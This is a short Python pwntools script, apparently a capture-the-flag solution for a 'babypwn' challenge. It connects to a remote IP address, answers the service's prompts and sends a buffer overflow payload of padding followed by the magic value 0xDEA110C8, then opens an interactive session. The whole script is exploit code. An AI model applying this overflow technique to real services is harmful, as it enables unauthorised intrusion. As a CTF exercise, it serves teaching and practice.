from pwn import *
p = remote('23.236.125.55','10002')
context.log_level = 'debug'
#p = process("./babypwn")
messg = p.recvuntil("What... is your name?\n")
print messg
p.sendline("Sir Lancelot of Camelot")
messg = p.recvuntil("What... is your quest?\n")
print messg
p.sendline("To seek the Holy Grail.")
messg = p.recvuntil("What... is my secret?")
print messg
length = 0x3b - 0x10
print(hex(length))
payload = 'a' * length + p32(0xDEA110C8)
print payload
messg = p.sendline(payload)
print messg
p.interactive()
